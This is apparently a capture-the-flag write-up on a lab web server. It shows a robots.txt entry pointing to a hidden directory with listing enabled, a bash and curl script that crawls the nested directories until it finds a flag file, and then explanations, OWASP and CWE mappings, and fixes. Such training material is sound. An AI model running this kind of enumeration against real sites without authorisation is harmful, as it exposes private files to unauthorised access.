# Information Disclosure via robots.txt - Hidden Directory Vulnerability

## How I Found It

### Step-by-Step Discovery Process

1. **Initial Reconnaissance**
   - Started exploring the website systematically
   - Checked for common information disclosure files
   - Navigated to `http://192.168.1.16/robots.txt`

2. **Analyzed robots.txt Content**
   - Found the following directives:
   ```
   User-agent: *
   Disallow: /whatever
   Disallow: /.hidden
   ```
   - The `/.hidden` path immediately raised suspicion as hidden directories often contain sensitive information

3. **Explored the Hidden Directory**
   - Visited `http://192.168.1.16/.hidden/`
   - Discovered directory listing was enabled
   - Found 26 subdirectories with random alphanumeric names:
     - `amcbevgondgcrloowluziypjdh/`
     - `bnqupesbgvhbcwqhcuynjolwkm/`
     - `ceicqljdddshxvnvdqzzjgddht/`
     - ... and 23 more
   - Also found a `README` file

4. **Checked the README File**
   - Content: "Tu veux de l'aide ? Moi aussi !"
   - This was a hint that manual exploration would be tedious

5. **Identified the Challenge**
   - Recognized this as a recursive directory maze
   - Each subdirectory likely contained more subdirectories
   - Manual exploration would take hours or days
   - Decided to automate the search process

---

## How I Exploited It

### Manual Exploration (Initial Attempt)

Started clicking through directories manually but quickly realized the scale:
- Each directory contained 26+ more subdirectories
- Multiple levels deep (3-4 levels minimum)
- Hundreds or thousands of potential paths

### Automated Approach (Successful)

Created a bash script to recursively search all directories and files:

**Script: `search_hidden.sh`**

```bash
#!/bin/bash
BASE_URL="http://192.168.1.16/.hidden/"

function searchDirectory() {
    local url=$1
    
    content=$(curl -s "$url" 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        return
    fi
    
    # Extract all links from the HTML
    links=$(echo "$content" | grep -oP 'href="\K[^"]+')
    
    for link in $links; do
        # Skip the parent directory link
        if [[ "$link" == "../" ]] || [[ "$link" == ".." ]]; then
            continue
        fi
        
        full_url="${url}${link}"
        
        # Check if it's a directory (ends with /)
        if [[ "$link" == */ ]]; then
            # It's a directory, search it recursively
            searchDirectory "$full_url"
        else
            # It's a file, download its content
            file_content=$(curl -s "$full_url" 2>/dev/null)
            
            # Check if it contains a 64-character hex string (the flag)
            if [[ "$file_content" =~ [a-f0-9]{64} ]]; then
                echo ""
                echo "============================================================"
                echo "FLAG FOUND!"
                echo "URL: $full_url"
                echo "Content: $file_content"
                echo "============================================================"
                echo ""
            fi
        fi
    done
}

echo "Searching for flag in /.hidden/ directory..."
searchDirectory "$BASE_URL"
echo "Search complete!"
```

**How to Use:**
```bash
chmod +x search_hidden.sh
./search_hidden.sh
```

**Result:**
```
FLAG FOUND!
URL: http://192.168.1.16/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
Content: Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

**Flag:** `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`

---

## Why It Works (Vulnerability Explanation)

### 1. Information Disclosure via robots.txt

**What is robots.txt?**
- A text file placed in the website root directory
- Used to instruct web crawlers (like Google, Bing) which pages to index or ignore
- Standard defined by the Robots Exclusion Protocol

**The Problem:**
- `robots.txt` is publicly accessible by anyone
- It reveals directory structure and sensitive paths
- Attackers use it as a roadmap to find interesting locations
- The `Disallow` directives act as breadcrumbs pointing to potentially sensitive areas

**In this case:**
```
Disallow: /.hidden
```
This directive tells attackers: "There's something at `/.hidden` we don't want indexed" - which naturally makes it a prime target for investigation.

### 2. Directory Listing Enabled

**The Vulnerability:**
- The web server (Apache/Nginx) has directory listing enabled
- When no index file exists (index.html, index.php), the server displays all files and folders
- This allows attackers to browse the entire directory structure

**What Should Happen:**
- Directory listing should be disabled
- Users should receive a 403 Forbidden error when accessing directories without index files

**What Actually Happened:**
- Full directory listing was displayed
- All subdirectories and files were visible
- Attackers could map the entire hidden structure

### 3. Security Through Obscurity

**The Failed Strategy:**
- The application attempted to hide sensitive information by:
  - Using a "hidden" directory name (`.hidden`)
  - Creating a complex maze of randomly-named subdirectories
  - Burying the flag deep in the directory structure (3 levels deep)

**Why This Failed:**
- Obscurity is NOT security
- Automated tools can traverse directories in seconds
- A simple recursive script defeats this "protection"
- The information was still accessible - just inconvenient to find manually

### 4. No Access Control

**Critical Flaw:**
- No authentication required to access `/.hidden/`
- No authorization checks on file access
- Anyone can read any file in the directory structure

**Should Have:**
- Required authentication (username/password)
- Implemented proper access controls
- Used server-side authorization checks

---

## How to Fix It

### 1. Remove Sensitive Paths from robots.txt

### 2. Disable Directory Listing

### 3. Implement Proper Access Controls

### 4. Use Proper File Permissions

### 5. Don't Store Sensitive Data in Web-Accessible Locations

---

## Security Impact

**Severity: MEDIUM to HIGH**

### Potential Consequences:

1. **Information Disclosure**
   - Reveals directory structure
   - Exposes hidden files and data
   - Leaks sensitive configuration information

2. **Reconnaissance for Further Attacks**
   - Attackers map the application structure
   - Identify other potential vulnerabilities
   - Find admin panels, backup files, or configuration files

3. **Data Breach**
   - Sensitive files may be exposed
   - Customer data, credentials, or proprietary information at risk

---

## OWASP Classification

- **Primary:** A01:2021 – Broken Access Control
- **Secondary:** A05:2021 – Security Misconfiguration
- **Related:** A04:2021 – Insecure Design

**CWE References:**
- CWE-548: Information Exposure Through Directory Listing
- CWE-276: Incorrect Default Permissions
- CWE-552: Files or Directories Accessible to External Parties

---

## Tools Used

- **curl** - Command-line tool for transferring data with URLs
- **grep** - Pattern matching tool for extracting links
- **bash** - Shell scripting for automation

---

## Lessons Learned

1. **Never trust obscurity as a security measure** - Hidden paths are not secure
2. **Always disable directory listing** - It's rarely needed and often dangerous
3. **Use proper authentication** - Don't rely on hiding files
4. **Keep sensitive data outside the web root** - Defense in depth
5. **robots.txt is public information** - Don't use it to hide secrets
6. **Automation defeats manual obscurity** - What takes hours manually takes seconds with a script

---

## References

- **CWE-548:** https://cwe.mitre.org/data/definitions/548.html
- **Robots Exclusion Protocol:** https://www.robotstxt.org/

---

## Conclusion

This vulnerability demonstrates multiple security failures:

1. **Information disclosure** through robots.txt
2. **Directory listing enabled** allowing full structure enumeration
3. **Security through obscurity** instead of proper access controls
4. **No authentication** on sensitive directories

The fix requires a multi-layered approach: removing sensitive paths from robots.txt, disabling directory listing, implementing proper authentication, and storing sensitive data outside the web root.

**Remember: Obscurity ≠ Security**

---